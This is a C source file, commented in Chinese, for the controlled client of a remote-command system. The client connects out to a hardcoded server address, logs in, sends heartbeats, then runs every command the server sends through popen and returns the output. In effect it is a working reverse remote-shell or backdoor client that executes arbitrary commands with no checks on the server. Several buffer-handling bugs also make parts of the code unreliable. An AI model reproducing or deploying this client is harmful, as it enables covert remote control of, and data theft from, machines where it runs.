//被控制端:接收服务器的命令，将执行命令的结果返回给服务器

#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <time.h>
#include <sys/types.h>         
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>

#define MSG_TYPE_LOGIN                          (0)
#define MSG_TYPE_LOGIN_RESULT                   (1)
#define MSG_TYPE_LOGIN_OUT                      (2)
#define MSG_TYPE_HEART                          (3)
#define MSG_TYPE_COMMD                          (4)
#define MSG_TYPE_COMMD_RESULT                   (5)
#define MSG_TYPE_COMMD_LIST_CLIENT              (6)
#define MSG_TYPE_COMMD_LIST_CLIENT_RESULT       (7)


#define SERVER_IP                           "x.x.x.x" //公网ip
#define SERVER_PORT                         8090

#define LOGIN_TYPE_CLIENT                   (0)
#define LOGIN_TYPE_CONTROL                  (1)

#define LOGIN_STATE_SUCCESS                 (1)
#define LOGIN_STATE_FAILURE                 (0)

#define HEART_BEAT_INTERVAL                 (30)

typedef struct msg {
      int type;
      int length;
      char  value[0];
}MSG, *PMSG;
  
 
struct login {
    MSG msg;
    char type;
    char user[32];
    char password[32];
};

struct login_result {
    MSG msg;
    int code;
    char msgstr[256];
};

struct heartbeat {
    MSG msg;
    long time;
};

struct commd {
    MSG msg;
    char commdstr[256];
};

struct commd_result {
    MSG msg;
    char commdstr[0];
};




void    connect_server(struct sockaddr_in *server_addr, int sockfd);
void    do_login(int sockfd);
void    send_heartbeat(void *arg); 
void    do_implement(int sockfd);
char*   readtobuf(char *resultbuf, FILE *fp);
int     recv_full(int sockfd, char *buf, int len);
void    recv_tlv_buffer(int sockfd, char *buf);
void    send_tlv_buffer(int sockfd, char *buf);
char*   get_command(struct commd *command_packge);
void    send_result_packge(int sockfd, char *cmdbuf);
void    send_login_packge(int sockfd, char *sendbuf);
void    print_login_result(char *buf);

int main() 
{
    int sockfd;
    struct sockaddr_in server_addr;
    pthread_t ht_thread = 1;
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    if(sockfd < 0) {
        perror("socket failure:");
        exit(-1);
    }
    
    //connect server
    connect_server(&server_addr, sockfd);
    
    //login
    do_login(sockfd);
    
    //send heartbeat
    
    if(pthread_create(&ht_thread, NULL, (void *)send_heartbeat, &sockfd) != 0) {
        printf("ht_thread create failure\n");
    }
    pthread_detach(ht_thread);
    
    //implement command and return the result to the server
    do_implement(sockfd);

    return 0;
}


void connect_server(struct sockaddr_in *server_addr, int sockfd)
{
    server_addr->sin_family = AF_INET;
    server_addr->sin_addr.s_addr = inet_addr(SERVER_IP);
    server_addr->sin_port = htons(SERVER_PORT);
    
    if(connect(sockfd, (struct sockaddr *)server_addr, (socklen_t)sizeof(*server_addr)) < 0) {
        perror("connect failure:");
        close(sockfd);
        exit(-1);
    } else {
        printf("connect successfully\n");
    }
}

void do_login(int sockfd)
{
    char buf[300];   
    
    memset(buf, 0, 300);
    printf("sending login_packge...\n");
    send_login_packge(sockfd, buf);
    
    printf("has send login_packge \n");
    
    printf("recving login_result ...\n");
    
    memset(buf, 0, 300);
    recv_tlv_buffer(sockfd, (char *)buf);
    
    printf("recv login result successfully\n");
    print_login_result(buf);
    
}

void send_login_packge(int sockfd, char *sendbuf)
{
    int i;
    struct login *login = (struct login *)sendbuf;
    
    login->msg.type = MSG_TYPE_LOGIN;
    login->msg.length = 64 + 1;
    login->type = LOGIN_TYPE_CLIENT;
    
    for(i = 1; i < 65; i++) {
        login->msg.value[i] = 0xff;
    }
    
    send_tlv_buffer(sockfd, (char *)sendbuf);
    
    return ;
}

void print_login_result(char *buf)
{
    struct login_result *login_result = (struct login_result *)buf;
    
    if(login_result->code == LOGIN_STATE_SUCCESS) {
        printf("%s\n", login_result->msgstr);
    } else {
        
        printf("login failure\n");
    }
    
    return ;
}

void send_heartbeat(void *arg) 
{
    int sockfd = *(int *)arg;
    char sendbuf[16];
    struct heartbeat *heartbeat_packge = (struct heartbeat *)sendbuf;
    
    
    memset(sendbuf, 0, 16);
    heartbeat_packge->msg.type = MSG_TYPE_HEART;
    heartbeat_packge->msg.length = sizeof(long);
    heartbeat_packge->time = time(NULL);
    
    while(1) {
        
        sleep(HEART_BEAT_INTERVAL);
        send_tlv_buffer(sockfd, (char *)sendbuf);
        
    }
    
    return ;
}

void do_implement(int sockfd)
{
    MSG *msg = NULL;    
    char cmdbuf[256];
    char recvbuf[256 + 8];
    
    while(1) {
        memset(recvbuf, 0, sizeof(recvbuf));
        memset(cmdbuf, 0, sizeof(cmdbuf));
                    
                    
        recv_tlv_buffer(sockfd, (char *)recvbuf);
        
        msg = (MSG *)recvbuf;
        
        if(msg->type == MSG_TYPE_COMMD) {

            strncpy(cmdbuf, get_command((struct commd *)recvbuf), 256);
            
            printf("from server command: %s\n", cmdbuf);
            send_result_packge(sockfd, cmdbuf);
        }

        
    }     
}

char *get_command(struct commd *command_packge)
{
    return command_packge->commdstr;
}

void send_result_packge(int sockfd, char *cmdbuf)
{
    FILE *fp = NULL;
    char sendbuf[4096];
    char *pbuf = sendbuf;
    MSG *msg = (MSG *)sendbuf;
    
    memset(sendbuf, 0, 4096);
    
    fp = popen(cmdbuf, "r");
    
    readtobuf(&pbuf[8], fp);
    
    pclose(fp);
    
    msg->type = MSG_TYPE_COMMD_RESULT;
    msg->length = 256 - 8;
    
    send_tlv_buffer(sockfd, (char *)sendbuf);
}

void make_login_packge(struct login *login_packge)
{
    int i;
    
    login_packge->msg.type = MSG_TYPE_LOGIN;
    login_packge->msg.length = 65;
    login_packge->type = LOGIN_TYPE_CLIENT;
    
    for(i = 1; i < 65; i++) {
        login_packge->msg.value[i] = 0xff;
    }
    
    return ;
}

char* readtobuf(char *resultbuf, FILE *fp) 
{
    
    fread(resultbuf, 1, 4088, fp);
    
    printf("%s\n", resultbuf);
    
    return resultbuf;
}



int recv_full(int sockfd, char *buf, int len)
{
    int hasrecv = 0;
    int ret;
    
    while(hasrecv < len) {
        
        if( (ret = recv(sockfd, buf, len, 0)) > 0) {
            hasrecv = hasrecv + ret;
        } else if(ret == 0) {
            printf("peer shutdown\n");
            //close(sockfd);
            //exit(0);
            break;
        } else {
            printf("recv failure: %s\n", strerror(errno));
            break;
        }
  
    }
    
    return hasrecv;
}

void recv_tlv_buffer(int sockfd, char *buf)
{
    int n = 0;
    char *pbuf = buf;
    int headlen = sizeof(MSG);
    MSG *msg = (MSG *)buf;
    
    if((n = recv_full(sockfd, pbuf, headlen)) > 0) {//记得打括号
        if(n == headlen) {
            printf("recv the msg head:%d bytes\n", n);
        }
    }
    
    if((n = recv_full(sockfd, &pbuf[headlen], msg->length)) > 0) {
        if(n == msg->length) {
            printf("recv the msg tail:%d bytes\n", n);
        }
    }
    
    return ;
}

void send_tlv_buffer(int sockfd, char *buf)
{
    int n = 0;
    char *pbuf = buf;
    int headlen = sizeof(MSG);
    MSG *msg = (MSG *)buf;
    
    if((n = send(sockfd, pbuf, headlen, 0)) > 0) {
        if(n == headlen) {
            printf("send the msg head\n");
        } else {
            send(sockfd, &pbuf[n], headlen - n, 0);
        }
    } else {
        if(n == 0) {
            printf("kernel buffer is full\n");
        } else {
            printf("send error:%s\n", strerror(errno));
        }
    }
    
    if(msg->length > 0) {
        if((n = send(sockfd, &pbuf[headlen], msg->length, 0)) > 0) {
            if(n == msg->length) {
                printf("send the msg tail\n");
            } else {
                send(sockfd, &pbuf[n], msg->length - n, 0);
            }
        } else {
            if(n == 0) {
                printf("kernel buffer is full\n");
            } else {
                printf("send error:%s\n", strerror(errno));
            }        
        }
    }
    
    
    return ;
}





